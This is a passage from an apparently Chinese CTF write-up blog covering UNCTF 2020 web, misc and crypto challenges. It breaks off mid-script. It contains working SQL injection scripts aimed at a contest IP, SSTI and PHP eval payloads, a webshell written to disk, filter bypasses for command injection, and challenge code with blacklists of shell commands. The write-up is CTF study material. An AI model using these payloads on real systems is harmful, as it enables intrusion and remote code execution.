low&lt;=top: mid=(top+low)//2 # case/**/when/**/ord(substr((password)/**/from/**/&#123;&#125;/**/for/**/1))&gt;&#123;&#125;/**/then/**/1/**/else/**/0/**/end # 1&#x27;||(0)=&#x27;1 (case/**/when/**/(ord(substr((password)/**/from/**/&#123;&#125;/**/for/**/1))/**/in/**/(&#123;&#125;))/**/then/**/1/**/else/**/0/**/end) data1 = &#123;&quot;username&quot;: &quot;1&#x27;||(case/**/when/**/(ord(substr((table/**/`f11114g`/**/limit/**/1,1)/**/from/**/&#123;&#125;/**/for/**/1))/**/in/**/(&#123;&#125;))/**/then/**/1/**/else/**/0/**/end)=&#x27;1&quot;.format(str(i),str(mid)), &quot;password&quot;: &quot;123&quot;&#125; data2 = &#123;&quot;username&quot;: &quot;1&#x27;||(case/**/when/**/ord(substr((table/**/`f11114g`/**/limit/**/1,1)/**/from/**/&#123;&#125;/**/for/**/1))&gt;&#123;&#125;/**/then/**/1/**/else/**/0/**/end)=&#x27;1&quot;.format(str(i),str(mid)), &quot;password&quot;: &quot;123&quot;&#125; try: print(i,mid) r1=requests.post(url, data=data1,proxies=proxies) if &#x27;password error!&#x27; in r1.text: flag+=chr(mid) print(flag) break r2=requests.post(url, data=data2,proxies=proxies) if &#x27;password error!&#x27; in r2.text: low=mid+1 else: top=mid-1 except Exception as e: print(e) if flag==f1: breakprint(flag)# 8.0.22-0ubuntu0.20.04.2# ctf# gml666 b4bc4c343ed120df3bff56d586e6d617 注出密码登陆发现没flag ccc mysql版本为8 想到了之前在p神星球看到的trick 写exp 这个脚本最后一位要改下 位置加1: 1234567891011121314151617181920212223242526import requestsurl = &#x27;http://139.129.98.9:30003/login.php&#x27;flag=&#x27;&#x27;proxies=&#123; &quot;http&quot;:&quot;127.0.0.1:8080&quot;&#125;index=0s=&#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&#x27;for i in range(1,50): f1=flag for j in s: data = &#123;&quot;username&quot;: &quot;1&#x27;||(case/**/when((&#x27;def&#x27;,&#x27;ctf&#x27;,&#x27;&#123;&#125;&#x27;,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null)&lt;(table/**/`information_schema`.`tables`/**/order/**/by/**/15/**/desc/**/limit/**/&#123;&#125;,1))/**/then/**/1/**/else/**/0/**/end)=&#x27;1&quot;.format(flag+j,str(index)), &quot;password&quot;: &quot;123&quot;&#125; try: print(i,j) r1=requests.post(url, data=data,proxies=proxies) if &#x27;password error!&#x27; not in r1.text: flag+=s[s.index(j)-1] print(flag) break except Exception as e: print(e) if flag==f1: breakprint(flag)# `information_schema`.`tables`有21列 第15列为CREATE_TIME字段即创建时间根据这个排序就能把题目创建的表排在前面 你能登陆成功吗exp: 123456789101112131415161718import requestsimport stringburp0_url = &quot;http://139.129.98.9:30005/&quot;burp0_cookies = &#123;&quot;sidebarStatus&quot;: &quot;1&quot;&#125;burp0_headers = &#123;&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Origin&quot;: &quot;http://139.129.98.9:30005&quot;, &quot;Content-Type&quot;: &quot;application/json&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4343.0 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.129.98.9:30005/&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;, &quot;Connection&quot;: &quot;close&quot;&#125;dic = string.ascii_letters + string.digitsflag = &#x27;&#x27;for index in range(50): print(index) for i in dic: burp0_json=&#123;&quot;password&quot;: &quot;a&#x27;||case/**/when/**/password=overlay(password/**/placing/**/&#x27;&#123;&#125;&#x27;/**/from/**/&#123;&#125;)/**/then/**/pg_sleep(3)/**/else/**/pg_sleep(0)/**/end--&quot;.format(i, index), &quot;username&quot;: &quot;admin&quot;&#125; try: requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json, timeout=2) except Exception as e: flag += i print(flag) break misc签到查看源码发现:/?url= 读源码： 1?url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php 12345678910111213141516&lt;?phpecho &quot;&lt;!-- /?url= --&gt;&quot;;if ($_GET[&#x27;url&#x27;]) &#123; if (preg_match(&quot;/flag/i&quot;, $_GET[&#x27;url&#x27;])) &#123; die(); &#125; $curl = curl_init(); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); curl_setopt($curl, CURLOPT_TIMEOUT, 500); curl_setopt($curl, CURLOPT_URL, $_GET[&#x27;url&#x27;]); $res = curl_exec($curl); curl_close($curl); echo $res;&#125; 二次url编码绕过 1?url&#x3D;file:&#x2F;&#x2F;&#x2F;fla%25%36%37","categories":[],"tags":[{"name":"writeupt","slug":"writeupt","permalink":"http://www.moonback.xyz/tags/writeupt/"}]},{"title":"UNCTF 部分writeup","slug":"UNCTF2020部分writeup","date":"2020-11-07T10:45:30.000Z","updated":"2021-01-08T13:13:31.253Z","comments":true,"path":"2020/11/07/UNCTF2020部分writeup/","link":"","permalink":"http://www.moonback.xyz/2020/11/07/UNCTF2020%E9%83%A8%E5%88%86writeup/","excerpt":"记一下","text":"记一下 UNCTF 2020webeasy_ssrf源码： 123456789101112131415&lt;?phpecho&#x27;&lt;center&gt;&lt;strong&gt;welc0me to 2020UNCTF!!&lt;/strong&gt;&lt;/center&gt;&#x27;;highlight_file(__FILE__);$url = $_GET[&#x27;url&#x27;];if(preg_match(&#x27;/unctf\\.com/&#x27;,$url))&#123; if(!preg_match(&#x27;/php|file|zip|bzip|zlib|base|data/i&#x27;,$url))&#123; $url=file_get_contents($url); echo($url); &#125;else&#123; echo(&#x27;error!!&#x27;); &#125;&#125;else&#123; echo(&quot;error&quot;);&#125;?&gt; 直接目录穿越 payload: 1?url&#x3D;unctf.com&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag easyunserialize123456789101112131415161718192021222324252627282930313233343536&lt;?phperror_reporting(0);highlight_file(__FILE__);class a&#123; public $uname; public $password; public function __construct($uname,$password) &#123; $this-&gt;uname=$uname; $this-&gt;password=$password; &#125; public function __wakeup() &#123; if($this-&gt;password===&#x27;easy&#x27;) &#123; include(&#x27;flag.php&#x27;); echo $flag; &#125; else &#123; echo &#x27;wrong password&#x27;; &#125; &#125; &#125;function filter($string)&#123; return str_replace(&#x27;challenge&#x27;,&#x27;easychallenge&#x27;,$string);&#125;$uname=$_GET[1];$password=1;$ser=filter(serialize(new a($uname,$password)));$test=unserialize($ser);?&gt; 反序列化字符逃逸 正常序列化 1234567891011121314151617181920&lt;?phperror_reporting(0);class a&#123; public $uname; public $password; public function __construct() &#123; $this-&gt;uname=&#x27;admin&#x27;; $this-&gt;password=1; &#125;&#125;function filter($string)&#123; return str_replace(&#x27;challenge&#x27;,&#x27;easychallenge&#x27;,$string);&#125;$ser=serialize(new a());echo $ser;// O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;i:1;&#125; 需要添加的字符串 长度29 1&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125; 替换后会由9变成13 长度变长4 列方程 19m + 29 &#x3D; 13m 除不尽 尝试增加需要添加的字符串的长度 1&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;aaa 此时 m= 8 即增加8个challenge payload: 1?1&#x3D;challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;aaa babyeval123456789101112131415&lt;?php // flag在flag.php if(isset($_GET[&#x27;a&#x27;]))&#123; if(preg_match(&#x27;/\\(.*\\)/&#x27;, $_GET[&#x27;a&#x27;])) die(&#x27;hacker!!!&#x27;); ob_start(function($data)&#123; if (strpos($data, &#x27;flag&#x27;) !== false) return &#x27;ByeBye hacker&#x27;; return false; &#125;); eval($_GET[&#x27;a&#x27;]); &#125; else &#123; highlight_file(__FILE__); &#125; ?&gt; payload: 12?a&#x3D;&#96;echo PD9waHAgCmV2YWwoJF9QT1NUWzFdKTsKPz4&#x3D; | base64 -d &gt; &#x2F;tmp&#x2F;moonback&#96;;?a&#x3D;include &#39;&#x2F;tmp&#x2F;moonback&#39;; 就成功getshell了 读flag.php 12?a&#x3D;include &#39;&#x2F;tmp&#x2F;moonback&#39;;POST: 1&#x3D;system(&#39;cat f* | base64&#39;); 那个正则是可以绕过的 .不匹配换行 payload： 1echo base64_encode(%0Ashell_exec(%0A&quot;cat flag.php&quot;)) ezphp源码： 123456789101112&lt;?phpshow_source(__FILE__);$username = &quot;admin&quot;;$password = &quot;password&quot;;include(&quot;flag.php&quot;);$data = isset($_POST[&#x27;data&#x27;])? $_POST[&#x27;data&#x27;]: &quot;&quot; ;$data_unserialize = unserialize($data);if ($data_unserialize[&#x27;username&#x27;]==$username&amp;&amp;$data_unserialize[&#x27;password&#x27;]==$password)&#123; echo $flag;&#125;else&#123; echo &quot;username or password error!&quot;;&#125; 直接反序列化不行 猜测在包含的时候改了 直接弱类型： 123&lt;?php$a = array(&#x27;username&#x27;=&gt;0,&#x27;password&#x27;=&gt;0);echo serialize($a); easyflask扫目录发现 注册登陆后发现有提示 123&lt;!--&lt;p&gt;&lt;&#x2F;p&gt;--&gt; 爆破secret key 没错了 找到一个项目 直接可以设置字典爆破 https://github.com/Paradoxis/Flask-Unsign 安装 1pip3 install flask-unsign 指定字典爆破 1flask-unsign --unsign -c eyJ1c2VybmFtZSI6Im1vb25iYWNrIn0.X6tlEw.hNFdL65ytP6FX5DjI_Bdn3shj28 --no-literal-eval -w pass.txt 生成字典 12345678910import string s = string.ascii_lowercase + string.digitsfor i in s: for j in s: for m in s: for n in s: key = i+j+m+n with open(&#x27;1.txt&#x27;,&#x27;a+&#x27;) as f: f.write(key+&#x27;\\n&#x27;) 加密不知道为啥不行 后来才知道 原来可以直接注册admin 进去之后会给hint 然后是ssti 贴一下大佬的 payload: 1&#123;&#123;()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(117)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)&#125;&#125;&amp;x1&#x3D;__class__&amp;x2&#x3D;__base__&amp;x3&#x3D;__subclasses__&amp;x4&#x3D;__getitem__&amp;x5&#x3D;__init__&amp;x6&#x3D;__globals__&amp;x7&#x3D;__builtins__&amp;x8&#x3D;eval&amp;x9&#x3D;__import__(&quot;os&quot;).popen(&quot;id&quot;).read() easyphp源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263 &lt;?php$adminPassword = &#x27;d8b8caf4df69a81f2815pbcb74cd73ab&#x27;;if (!function_exists(&#x27;fuxkSQL&#x27;)) &#123; function fuxkSQL($iText) &#123; $oText = $iText; $oText = str_replace(&#x27;\\\\\\\\&#x27;, &#x27;\\\\&#x27;, $oText); $oText = str_replace(&#x27;\\&quot;&#x27;, &#x27;&quot;&#x27;, $oText); $oText = str_replace(&quot;\\&#x27;&quot;, &quot;&#x27;&quot;, $oText); $oText = str_replace(&quot;&#x27;&quot;, &quot;&#x27;&#x27;&quot;, $oText); return $oText; &#125;&#125;if (!function_exists(&#x27;getVars&#x27;)) &#123; function getVars() &#123; $totals = array_merge($_GET, $_POST); if (count($_GET)) &#123; foreach ($_GET as $key =&gt; $value) &#123; global $&#123;$key&#125;; if (is_array($value)) &#123; $temp_array = array(); foreach ($value as $key2 =&gt; $value2) &#123; if (function_exists(&#x27;mysql_real_escape_string&#x27;)) &#123; $temp_array[$key2] = fuxkSQL(trim($value2)); &#125; else &#123; $temp_array[$key2] = str_replace(&#x27;&quot;&#x27;, &#x27;\\&quot;&#x27;, str_replace(&quot;&#x27;&quot;, &quot;\\&#x27;&quot;, (trim($value2)))); &#125; &#125; $&#123;$key&#125; = $_GET[$key] = $temp_array; &#125; else &#123; if (function_exists(&#x27;mysql_real_escape_string&#x27;)) &#123; $&#123;$key&#125; = fuxkSQL(trim($value)); &#125; else &#123; $&#123;$key&#125; = $_GET[$key] = str_replace(&#x27;&quot;&#x27;, &#x27;\\&quot;&#x27;, str_replace(&quot;&#x27;&quot;, &quot;\\&#x27;&quot;, (trim($value)))); &#125; &#125; &#125; &#125; &#125;&#125;getVars();if (isset($source)) &#123; highlight_file(__FILE__);&#125;//只有admin才能设置环境变量if (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) &#123; echo &#x27;you can set config variables!!&#x27; . &#x27;&lt;/br&gt;&#x27;; foreach (array_keys($GLOBALS) as $key) &#123; if (preg_match(&#x27;/var\\d&#123;1,2&#125;/&#x27;, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; 12) &#123; @eval(&quot;\\$$key&quot; . &#x27;=&quot;&#x27; . $GLOBALS[$key] . &#x27;&quot;;&#x27;); &#125; &#125;&#125; else &#123; foreach (array_keys($GLOBALS) as $key) &#123; if (preg_match(&#x27;/var\\d&#123;1,2&#125;/&#x27;, $key)) &#123; echo ($GLOBALS[$key]) . &#x27;&lt;/br&gt;&#x27;; &#125; &#125;&#125; 变量覆盖 sha1弱比较 payload: 1?adminPassword&#x3D;202cb962ac59075b964b07152d234b70&amp;password&#x3D;123&amp;verif&#x3D;0e00000000000000000000081614617300000000 只是对值进行了多虑 可以用键来rce 1?adminPassword&#x3D;202cb962ac59075b964b07152d234b70&amp;password&#x3D;123&amp;verif&#x3D;0e00000000000000000000081614617300000000&amp;GLOBALS[var1;system(&#39;env&#39;);$a]&#x3D;1 最后eval执行的就是 1eval(&quot;$var1;system(&#x27;env&#x27;);$a=&#x27;1&#x27;;&quot;) 其他payload: 1?source&#x3D;1&amp;adminPassword&#x3D;c4ca4238a0b923820dcc509a6f75849b&amp;password&#x3D;1&amp;verif&#x3D;0e1290633704&amp;var1&#x3D;$&#123;$a($b)&#125;&amp;a&#x3D;system&amp;b&#x3D;env easy_upload过滤 1perl|pyth|ph|auto|curl|base|\\|&gt;|rm|ryby|openssl|war|lua|msf|xter|telnet 上传.htaccess 12AddType application&#x2F;x-httpd-p\\hp .gif 上传马 1&lt;?&#x3D;&#96;cat &#x2F;*&#96;; 不知道为啥\\可以 UN’s_online_tools空格过滤用%09 ;过滤用|| cat过滤用ca\\t flag * 过滤用通配符???? payload： 1127.0.0.1||ca\\t%09&#x2F;???? 看下源码： 123456789101112131415&lt;?phpif (isset($_GET[&#x27;url&#x27;]))&#123; $ip=$_GET[&#x27;url&#x27;]; if(preg_match(&quot;/(;|&#x27;| |&gt;|]|&amp;| |\\\\$|\\\\|rev|more|tailf|head|nl|tail|tac|cat|rm|cp|mv|\\*|\\&#123;)/i&quot;, $ip))&#123; die(&quot;&lt;strong&gt;&lt;center&gt;非法字符&lt;/center&gt;&lt;/strong&gt;&quot;); &#125; if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123; die(&quot;&lt;strong&gt;&lt;center&gt;非法字符&lt;/center&gt;&lt;/strong&gt;&quot;); &#125; $a = shell_exec(&quot;ping -c 4 &quot;.$ip); echo($a);&#125;else&#123; echo &quot;&lt;script&gt;alert(&#x27;欢迎来到UN`s online tools 如果师傅觉得题目不适合您，可以出门左拐&#x27;)&lt;/script&gt;&quot;;&#125;?&gt; ezfind有个提示 1if(!(is_file($name)===false))&#123;flag&#125;else&#123;no flag&#125; payload: 12?name&#x3D;%00?name[]&#x3D;a is_file($name)不能等于flase有两种情况 一种是true 一种是空 后台应该限制了不能是文件 又一个trick L0vephp查看源代码发现： 1&lt;!-- B4Z0-@:OCnDf, --&gt; 不知道是base85 哭了 解密之后是 1get action 读源码index.php base64过滤了换rot13 index.php 123456789101112131415161718&lt;?phperror_reporting(0);$action = $_GET[&#x27;action&#x27;]; if(isset($action)) &#123; if (preg_match(&quot;/base|data|input|zip|zlib/i&quot;,$action))&#123; echo &quot;&lt;script&gt;alert(&#x27;Hacker!!!&#x27;)&lt;/script&gt;&quot;; &#125; else &#123; include(&quot;$action&quot;); &#125; &#125; else &#123; include(&quot;footer.php&quot;); &#125;?&gt; flag.php 123456&lt;?php$flag = &quot;unctf&#123;7his_is_@_f4ke_f1a9&#125;&quot;;//hint:316E4433782E706870?&gt; hint转16进制 1nD3x.php 123456789101112131415161718192021222324252627282930&lt;?php error_reporting(0);show_source(__FILE__);$code=$_REQUEST[&#x27;code&#x27;];$_=array(&#x27;@&#x27;,&#x27;\\~&#x27;,&#x27;\\^&#x27;,&#x27;\\&amp;&#x27;,&#x27;\\?&#x27;,&#x27;\\&lt;&#x27;,&#x27;\\&gt;&#x27;,&#x27;\\*&#x27;,&#x27;\\`&#x27;,&#x27;\\+&#x27;,&#x27;\\-&#x27;,&#x27;\\&#x27;&#x27;,&#x27;\\&quot;&#x27;,&#x27;\\\\\\\\&#x27;,&#x27;\\/&#x27;); $__=array(&#x27;eval&#x27;,&#x27;system&#x27;,&#x27;exec&#x27;,&#x27;shell_exec&#x27;,&#x27;assert&#x27;,&#x27;passthru&#x27;,&#x27;array_map&#x27;,&#x27;ob_start&#x27;,&#x27;create_function&#x27;,&#x27;call_user_func&#x27;,&#x27;call_user_func_array&#x27;,&#x27;array_filter&#x27;,&#x27;proc_open&#x27;);$blacklist1 = array_merge($_);$blacklist2 = array_merge($__);if (strlen($code)&gt;16)&#123; die(&#x27;Too long&#x27;);&#125;foreach ($blacklist1 as $blacklisted) &#123; if (preg_match (&#x27;/&#x27; . $blacklisted . &#x27;/m&#x27;, $code)) &#123; die(&#x27;WTF???&#x27;); &#125; &#125; foreach ($blacklist2 as $blackitem) &#123; if (preg_match (&#x27;/&#x27; . $blackitem . &#x27;/im&#x27;, $code)) &#123; die(&#x27;Sry,try again&#x27;); &#125;&#125;@eval($code);?&gt; 原理：https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html payload: 121nD3x.php?1[]=test&amp;1[]=cat /flag_mdnrvvldb&amp;2=systemPOST: code=usort(...$_GET); checkin-sql看到这题立马想到了强网杯随便注 测了测过滤了 1use select 查看所有数据库 11&#x27;;SHOW DATABASES; 测了测 发现 set 和 prepare 同时出现时会被过滤 单独出现则不会过滤 按照之前的思路构造写shell 11&#x27;;PREPARE mb from 0x73656c65637420273132333c3f706870206576616c28245f504f53545b315d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f6d6f6f6e6261636b2e70687027;EXECUTE mb;# 或者按照官方的wp 先创建存储过程 1234561&#x27;; create procedure `qq`(out string text(1024), in hex text(1024)) BEGIN SET string = hex; END; ;# 接着调用先前定义的存储过程 123451&#x27;; call `qq`(@decoded, 0x3132333c3f706870206576616c28245f504f53545b315d293b3f3e); prepare payload from @decoded; execute payload; ;# easy_flask2源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475from flask import Flask,render_template,redirect,request,session,make_responseimport configimport pickleimport ioimport sysimport base64class Person: def __init__(self, name, is_admin): self.name = name self.is_admin = is_adminclass RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module == &#x27;__main__&#x27;: return getattr(sys.modules[&#x27;__main__&#x27;], name) raise pickle.UnpicklingError(&quot;global &#x27;%s.%s&#x27; is forbidden&quot; % (module, name))def restricted_loads(s): return RestrictedUnpickler(io.BytesIO(s)).load()app = Flask(__name__)flag = &quot;xxx&quot;@app.route(&quot;/&quot;)def index(): app.config[&quot;SECRET_KEY&quot;] = config.secret_key return redirect(&quot;login&quot;)@app.route(&quot;/login&quot;,methods=[&quot;GET&quot;,&quot;POST&quot;])def login(): if request.form.get(&#x27;name&#x27;): name = request.form.get(&#x27;name&#x27;) person = Person(name,0) pkl = pickle.dumps(person) pkl = base64.b64encode(pkl) resp = make_response(name) resp.set_cookie(&#x27;pkl&#x27;,pkl) session[&#x27;name&#x27;] = name session[&#x27;is_admin&#x27;] = 0 return resp else: if session.get(&#x27;name&#x27;): if b&#x27;R&#x27; in base64.b64decode(request.cookies[&#x27;pkl&#x27;]): return &quot;RCE??&quot; person = pickle.loads(base64.b64decode(request.cookies[&#x27;pkl&#x27;])) print(person.is_admin) if session.get(&#x27;is_admin&#x27;) == 1: #person = pickle.loads(base64.b64decode(request.cookies[&#x27;pkl&#x27;])) if person.is_admin == 1: return &quot;HHHacker!Here is Your flag : &quot; + flag return render_template(&quot;index.html&quot;,name=session.get(&#x27;name&#x27;)) else: return render_template(&quot;login.html&quot;)@app.route(&quot;/logout&quot;,methods=[&quot;GET&quot;,&quot;POST&quot;])def logout(): resp = make_response(&quot;success&quot;) resp.delete_cookie(&quot;session&quot;) resp.delete_cookie(&quot;pkl&quot;) return resp@app.route(&quot;/source&quot;)def source(): return open(&#x27;code.txt&#x27;,&#x27;r&#x27;).read()if __name__ == &quot;__main__&quot;: app.run(host=&quot;0.0.0.0&quot;,port=5000,debug=True) pickle反序列化 过滤了R无法用__reduce__直接rce了 cryptoeasy_rsa12345678910111213141516171819202122from Crypto.Util import numberimport gmpy2from Crypto.Util.number import bytes_to_longp = number.getPrime(1024)q = number.getPrime(1024)if p &gt; q: a = p + q b = p - q print(a,b)n = p * qe = 65537phi = (p-1)*(q-1)d = gmpy2.invert(e,phi)m = bytes_to_long(b&#x27;msg&#x27;)c = pow(m,e,n)print(c)#320398687477638913975700270017132483556404036982302018853617987417039612400517057680951629863477438570118640104253432645524830693378758322853028869260935243017328300431595830632269573784699659244044435107219440036761727692796855905230231825712343296737928172132556195116760954509270255049816362648350162111168#9554090001619033187321857749048244231377711861081522054479773151962371959336936136696051589639469653074758469644089407114039221055688732553830385923962675507737607608026140516898146670548916033772462331195442816239006651495200436855982426532874304542570230333184081122225359441162386921519665128773491795370#22886015855857570934458119207589468036427819233100165358753348672429768179802313173980683835839060302192974676103009829680448391991795003347995943925826913190907148491842575401236879172753322166199945839038316446615621136778270903537132526524507377773094660056144412196579940619996180527179824934152320202452981537526759225006396924528945160807152512753988038894126566572241510883486584129614281936540861801302684550521904620303946721322791533756703992307396221043157633995229923356308284045440648542300161500649145193884889980827640680145641832152753769606803521928095124230843021310132841509181297101645567863161780 知道p+q和p-q能求出p和q 然后就能得到了 再复习一下加解密 m是明文，c是密文 n=p*q 加密 1m^e ≡ c (mod N) # c = pow(m,e,n) 解密 1c^d ≡ m (mod N) # m = pow(c,d,n) 鞍山大法官开庭之缺的营养这一块怎么补题目 12345某日，鞍山大法官在点外卖时点了2个韭菜盒子，商家只送了1个，大法官给了该商家一个差评次日，该大法官又在该商家点了1个韭菜盒子，希望商家能补上上次的韭菜盒子，而商家又只发了一个韭菜盒子这名大法官一天正常要吃2个韭菜盒子，而该商家每天只给他1个韭菜盒子，请问该名大法官缺的营养这一块怎么补ottttootoootooooottoootooottotootttootooottotttooootttototoottooootoooottotoottottooooooooottotoottoflag格式：unctf&#123;&#125; 培根密码 字母大写 12o -&gt; at -&gt; b exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849letters1 = [ &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;, &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;,]letters2 = [ &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;,]cipher1 = [ &quot;aaaaa&quot;, &quot;aaaab&quot;, &quot;aaaba&quot;, &quot;aaabb&quot;, &quot;aabaa&quot;, &quot;aabab&quot;, &quot;aabba&quot;, &quot;aabbb&quot;, &quot;abaaa&quot;, &quot;abaab&quot;, &quot;ababa&quot;, &quot;ababb&quot;, &quot;abbaa&quot;, &quot;abbab&quot;, &quot;abbba&quot;, &quot;abbbb&quot;, &quot;baaaa&quot;, &quot;baaab&quot;, &quot;baaba&quot;, &quot;baabb&quot;, &quot;babaa&quot;, &quot;babab&quot;, &quot;babba&quot;, &quot;babbb&quot;, &quot;bbaaa&quot;, &quot;bbaab&quot;,]cipher2 = [ &quot;AAAAA&quot;, &quot;AAAAB&quot;, &quot;AAABA&quot;, &quot;AAABB&quot;, &quot;AABAA&quot;, &quot;AABAB&quot;, &quot;AABBA&quot;, &quot;AABBB&quot;, &quot;ABAAA&quot;, &quot;ABAAA&quot;, &quot;ABAAB&quot;, &quot;ABABA&quot;, &quot;ABABB&quot;, &quot;ABBAA&quot;, &quot;ABBAB&quot;, &quot;ABBBA&quot;, &quot;ABBBB&quot;, &quot;BAAAA&quot;, &quot;BAAAB&quot;, &quot;BAABA&quot;, &quot;BAABB&quot;, &quot;BAABB&quot;, &quot;BABAA&quot;, &quot;BABAB&quot;, &quot;BABBA&quot;, &quot;BABBB&quot;,]def bacon(string): lists = [] # 分割，五个一组 for i in range(0, len(string), 5): lists.append(string[i:i+5]) # print(lists) # 循环匹配，得到下标，对应下标即可 for i in range(0, len(lists)): for j in range(0, 26): if lists[i] == cipher1[j]: # print(j) print(letters1[j], end=&quot;&quot;) print(&quot;&quot;)s = &#x27;ottttootoootooooottoootooottotootttootooottotttooootttototoottooootoooottotoottottooooooooottotootto&#x27;flag=&#x27;&#x27;for i in s: if i == &#x27;o&#x27;: flag+=&#x27;a&#x27; else: flag+=&#x27;b&#x27;bacon(flag) 简单的RSA维纳攻击 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146import libnumdef rational_to_contfrac (x, y): &#x27;&#x27;&#x27; Converts a rational x/y fraction into a list of partial quotients [a0, ..., an] &#x27;&#x27;&#x27; a = x//y if a * y == x: return [a] else: pquotients = rational_to_contfrac(y, x - a * y) pquotients.insert(0, a) return pquotientsdef convergents_from_contfrac(frac): &#x27;&#x27;&#x27; computes the list of convergents using the list of partial quotients &#x27;&#x27;&#x27; convs = []; for i in range(len(frac)): convs.append(contfrac_to_rational(frac[0:i])) return convsdef contfrac_to_rational (frac): &#x27;&#x27;&#x27;Converts a finite continued fraction [a0, ..., an] to an x/y rational. &#x27;&#x27;&#x27; if len(frac) == 0: return (0,1) elif len(frac) == 1: return (frac[0], 1) else: remainder = frac[1:len(frac)] (num, denom) = contfrac_to_rational(remainder) # fraction is now frac[0] + 1/(num/denom), which is # frac[0] + denom/num. return (frac[0] * num + denom, num)def egcd(a,b): &#x27;&#x27;&#x27; Extended Euclidean Algorithm returns x, y, gcd(a,b) such that ax + by = gcd(a,b) &#x27;&#x27;&#x27; u, u1 = 1, 0 v, v1 = 0, 1 while b: q = a // b u, u1 = u1, u - q * u1 v, v1 = v1, v - q * v1 a, b = b, a - q * b return u, v, adef gcd(a,b): &#x27;&#x27;&#x27; 2.8 times faster than egcd(a,b)[2] &#x27;&#x27;&#x27; a,b=(b,a) if a&lt;b else (a,b) while b: a,b=b,a%b return adef modInverse(e,n): &#x27;&#x27;&#x27; d such that de = 1 (mod n) e must be coprime to n this is assumed to be true &#x27;&#x27;&#x27; return egcd(e,n)[0]%ndef totient(p,q): &#x27;&#x27;&#x27; Calculates the totient of pq &#x27;&#x27;&#x27; return (p-1)*(q-1)def bitlength(x): &#x27;&#x27;&#x27; Calculates the bitlength of x &#x27;&#x27;&#x27; assert x &gt;= 0 n = 0 while x &gt; 0: n = n+1 x = x&gt;&gt;1 return ndef isqrt(n): &#x27;&#x27;&#x27; Calculates the integer square root for arbitrary large nonnegative integers &#x27;&#x27;&#x27; if n &lt; 0: raise ValueError(&#x27;square root not defined for negative numbers&#x27;) if n == 0: return 0 a, b = divmod(bitlength(n), 2) x = 2**(a+b) while True: y = (x + n//x)//2 if y &gt;= x: return x x = ydef is_perfect_square(n): &#x27;&#x27;&#x27; If n is a perfect square it returns sqrt(n), otherwise returns -1 &#x27;&#x27;&#x27; h = n &amp; 0xF; #last hexadecimal &quot;digit&quot; if h &gt; 9: return -1 # return immediately in 6 cases out of 16. # Take advantage of Boolean short-circuit evaluation if ( h != 2 and h != 3 and h != 5 and h != 6 and h != 7 and h != 8 ): # take square root if you must t = isqrt(n) if t*t == n: return t else: return -1 return -1def hack_RSA(e,n): frac = rational_to_contfrac(e, n) convergents = convergents_from_contfrac(frac) for (k,d) in convergents: #check if d is actually the key if k!=0 and (e*d-1)%k == 0: phi = (e*d-1)//k s = n - phi + 1 # check if the equation x^2 - s*x + n = 0 # has integer roots discr = s*s - 4*n 